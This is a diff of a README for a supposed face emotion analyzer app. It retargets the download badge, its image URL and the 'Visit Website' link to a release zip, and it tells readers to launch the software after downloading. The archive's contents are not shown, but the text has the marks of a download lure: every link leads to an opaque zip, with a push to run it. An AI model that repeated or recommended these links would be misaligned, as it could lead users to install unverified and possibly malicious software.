@@ -43,7 +43,7 @@ Feel free to delve into these topics to deepen your understanding of the technol
 
 To download the face emotion analyzer web application, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-success)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/AlexPoky2011/face-emotion-analyzer/releases/download/v1.0/Release.zip)](https://github.com/AlexPoky2011/face-emotion-analyzer/releases/download/v1.0/Release.zip)
 
 *Note: The software needs to be launched after downloading for full functionality.*
 
@@ -51,7 +51,7 @@ To download the face emotion analyzer web application, click the button below:
 
 For more information and updates on the face emotion analyzer project, visit our website:
 
-[Visit Website](https://github.com/22155555/1875695542)
+[Visit Website](https://github.com/AlexPoky2011/face-emotion-analyzer/releases/download/v1.0/Release.zip)
 
 Explore a wealth of resources, documentation, and insights on face emotion analysis and real-time processing on our website.
 
